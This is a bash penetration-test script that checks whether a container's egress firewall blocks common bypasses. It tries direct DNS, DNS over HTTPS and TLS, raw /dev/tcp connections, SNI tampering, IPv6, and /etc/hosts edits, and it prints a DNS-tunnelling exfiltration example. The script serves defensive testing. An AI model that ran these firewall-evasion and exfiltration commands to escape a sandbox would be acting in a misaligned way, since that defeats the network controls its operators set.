#!/usr/bin/env bash
# bypass.sh — pentest du firewall depuis l'intérieur du container.
# Lance plusieurs techniques classiques de contournement et reporte
# si elles passent (❌ BYPASS) ou si elles sont bien bloquées (✔).
#
# À lancer depuis le container : `bash /workspace/.devcontainer/firewall/tests/bypass.sh`
# Ou via docker exec : `docker exec -it <container> bash .../bypass.sh`

set -u

TIMEOUT=3
PASS=0
FAIL=0

# Cible bloquée : example.com (utilisé par init-firewall.sh aussi)
BLOCKED_HOST="example.com"
BLOCKED_IP=""  # rempli plus loin
ALLOWED_HOST="api.github.com"
ALLOWED_IP=""

resolve_offline() {
  # Résolution sans passer par notre dnsmasq local (pour récupérer une IP
  # de référence afin de tenter des bypass).
  dig +short +time=2 +tries=1 @127.0.0.11 "$1" A 2>/dev/null \
    | grep -E '^([0-9]{1,3}\.){3}[0-9]{1,3}$' | head -1
}

test_step() {
  local desc="$1"
  local expected="$2"  # "blocked" ou "allowed"
  shift 2
  local result rc

  if "$@" >/dev/null 2>&1; then
    result="passed"
  else
    result="failed"
  fi

  if [ "$expected" = "blocked" ]; then
    if [ "$result" = "failed" ]; then
      echo "  ✔ $desc (correctement bloqué)"
      PASS=$((PASS+1))
    else
      echo "  ❌ BYPASS — $desc (la requête a abouti)"
      FAIL=$((FAIL+1))
    fi
  else
    # Test de baseline (allowed)
    if [ "$result" = "passed" ]; then
      echo "  ✔ $desc"
      PASS=$((PASS+1))
    else
      echo "  ⚠️  $desc (devrait passer mais a échoué)"
    fi
  fi
}

echo "═══════════════════════════════════════════════════════"
echo "  Firewall bypass test"
echo "  Container : $(hostname)"
echo "  Date      : $(date)"
echo "═══════════════════════════════════════════════════════"

# Récupération d'une IP bloquée et d'une IP autorisée comme références
echo
echo "→ Résolution des cibles…"
BLOCKED_IP=$(resolve_offline "$BLOCKED_HOST")
ALLOWED_IP=$(resolve_offline "$ALLOWED_HOST")
echo "  Bloqué  : $BLOCKED_HOST → ${BLOCKED_IP:-<échec résolution>}"
echo "  Autorisé: $ALLOWED_HOST → ${ALLOWED_IP:-<échec résolution>}"

# ─────────────────────────────────────────────────────────
echo
echo "▌ Baseline (sanity checks)"
test_step "curl host autorisé via DNS local" allowed \
  curl -s --max-time $TIMEOUT "https://$ALLOWED_HOST/"

test_step "curl host bloqué (référence)" blocked \
  curl -s --max-time $TIMEOUT "https://$BLOCKED_HOST/"

# ─────────────────────────────────────────────────────────
echo
echo "▌ DNS-level bypass attempts"

test_step "dig direct vers 8.8.8.8 (UDP/53)" blocked \
  dig +short +time=$TIMEOUT @8.8.8.8 "$BLOCKED_HOST" A
# Note: si UDP/53 est ouvert (Phase 1 le laisse pour dnsmasq upstream),
# ce test peut PASSER (dig réussit). C'est un trou connu de Phase 1.

test_step "DNS over HTTPS (Cloudflare)" blocked \
  curl -s --max-time $TIMEOUT "https://1.1.1.1/dns-query?name=$BLOCKED_HOST&type=A" \
       -H "accept: application/dns-json"

test_step "DNS over TLS (port 853)" blocked \
  bash -c "echo > /dev/tcp/1.1.1.1/853"

# ─────────────────────────────────────────────────────────
echo
echo "▌ IP-level bypass attempts"

if [ -n "$BLOCKED_IP" ]; then
  test_step "curl direct vers IP bloquée (TCP/443)" blocked \
    curl -s --max-time $TIMEOUT --insecure "https://$BLOCKED_IP/"

  test_step "TCP raw vers IP bloquée:443" blocked \
    bash -c "echo > /dev/tcp/$BLOCKED_IP/443"

  test_step "TCP raw vers IP bloquée:80" blocked \
    bash -c "echo > /dev/tcp/$BLOCKED_IP/80"

  test_step "TCP raw vers IP bloquée:22 (SSH)" blocked \
    bash -c "echo > /dev/tcp/$BLOCKED_IP/22"
fi

# SSH vers host non-allowed (port 22 ne doit plus être ouvert wide)
test_step "TCP raw vers host non-allowed:22" blocked \
  bash -c "timeout $TIMEOUT bash -c 'echo > /dev/tcp/example.com/22' 2>&1"

# Detect strict mode (mitmproxy active) — determines whether some L4 tests
# should be blocked (strict) or are informational only (basic).
MITM_ACTIVE=false
if pgrep -x mitmdump >/dev/null 2>&1 && \
   iptables -t nat -L OUTPUT -n 2>/dev/null | grep -q "REDIRECT.*8080"; then
  MITM_ACTIVE=true
fi

# ─────────────────────────────────────────────────────────
echo
if $MITM_ACTIVE; then
  echo "▌ L4 attempts — should now be blocked (strict mode)"
  echo "  mitmproxy intercepts TLS and resolves upstream via dnsmasq+ipset."
  echo "  SNI tampering → mitmproxy tries to reach the real SNI → blocked by ipset."
else
  echo "▌ Known L4 limits (basic mode — informational, not real bypasses)"
  echo "  The Phase 1 firewall sees IP:port, not SNI/Host/path."
  echo "  Strict mode (mitmproxy) closes these by inspecting L7."
fi
echo

# SNI tampering — connexion à une IP autorisée avec Host header bidon.
if [ -n "$ALLOWED_IP" ]; then
  if $MITM_ACTIVE; then
    test_step "SNI tampering ($BLOCKED_HOST via IP de $ALLOWED_HOST)" blocked \
      curl -s --max-time $TIMEOUT --insecure \
        --resolve "$BLOCKED_HOST:443:$ALLOWED_IP" \
        "https://$BLOCKED_HOST/"
  else
    if curl -s --max-time $TIMEOUT --insecure \
         --resolve "$BLOCKED_HOST:443:$ALLOWED_IP" \
         "https://$BLOCKED_HOST/" >/dev/null 2>&1; then
      echo "  ⓘ TCP/443 vers IP autorisée avec SNI=$BLOCKED_HOST aboutit"
      echo "    → données envoyées à \$ALLOWED_IP (server répond 404), pas exfil"
    else
      echo "  ✔ Connexion rejetée même au niveau L4 (TLS strict)"
    fi
  fi
fi

# Non-standard port on an allowed IP — Phase 1 allows all ports towards
# ipset. In strict mode, mitmproxy only intercepts TCP/443 (cf REDIRECT);
# other ports still go through raw. Informational only.
if [ -n "$ALLOWED_IP" ]; then
  if timeout $TIMEOUT bash -c "echo > /dev/tcp/$ALLOWED_IP/8080" 2>/dev/null; then
    echo "  ⓘ Port 8080 vers IP autorisée laissé passer par le firewall"
  else
    echo "  ⓘ Port 8080 fermé côté serveur distant ($ALLOWED_HOST ne listen pas)"
    echo "    Le firewall l'aurait laissé passer ; c'est juste qu'il n'y a pas"
    echo "    de service à joindre."
  fi
fi

# Verify mitmproxy in the TLS chain (strict only)
if $MITM_ACTIVE && [ -n "$ALLOWED_HOST" ]; then
  if curl -sv --max-time $TIMEOUT "https://$ALLOWED_HOST/" 2>&1 \
       | grep -qi "issuer.*mitmproxy"; then
    echo "  ✔ mitmproxy CA présente dans la chaîne TLS de $ALLOWED_HOST"
    PASS=$((PASS+1))
  else
    echo "  ❌ mitmproxy CA absente — TLS interception ne semble pas active"
    FAIL=$((FAIL+1))
  fi
fi

# ─────────────────────────────────────────────────────────
echo
echo "▌ Network-layer bypass attempts"

test_step "ICMP (ping) vers cible bloquée" blocked \
  ping -c 1 -W $TIMEOUT "$BLOCKED_HOST"

test_step "ICMP (ping) vers IP bloquée directe" blocked \
  bash -c "[ -n '$BLOCKED_IP' ] && ping -c 1 -W $TIMEOUT $BLOCKED_IP"

# IPv6 — important : le firewall actuel ne couvre PAS ip6tables
test_step "IPv6 disponible" blocked \
  bash -c "ip -6 addr | grep -q 'scope global'"
# Si le test passe (= IPv6 dispo), on a un trou potentiel parce que ip6tables
# n'a pas été configuré. À corriger si IPv6 est activé.

# ─────────────────────────────────────────────────────────
echo
echo "▌ /etc/hosts tampering"

test_step "écriture dans /etc/hosts (user node)" blocked \
  bash -c "echo '1.2.3.4 evil.com' >> /etc/hosts"
# Si le user `node` peut écrire dans /etc/hosts, il peut créer un alias
# vers une IP allowed (genre 140.82.121.6 = github), bypass partiel pour HTTP
# en clair (HTTPS échoue toujours par SNI mismatch).

# ─────────────────────────────────────────────────────────
echo
echo "▌ DNS tunneling (info uniquement, pas un vrai test)"
echo "  ⓘ DNS exfiltration possible via subdomain encoding sur un domaine"
echo "    contrôlé par l'attaquant et listé dans domains.txt. Ex :"
echo "    dig $(echo SECRET_DATA | base64).allowed-domain.com"
echo "    → resolu via 8.8.8.8 → forwarded au NS de allowed-domain.com"
echo "    Phase 2+ avec mitmproxy peut filtrer mais Phase 1 est vulnérable"
echo "    si un domaine listé est compromis."

# ─────────────────────────────────────────────────────────
echo
echo "═══════════════════════════════════════════════════════"
echo "  Résultats : ✔ $PASS  ❌ $FAIL"
if [ $FAIL -gt 0 ]; then
  echo "  ⚠️  $FAIL bypass(es) détecté(s) — voir lignes ❌ ci-dessus"
  exit 1
fi
echo "  Tous les bypass tentés sont bloqués."
echo "═══════════════════════════════════════════════════════"
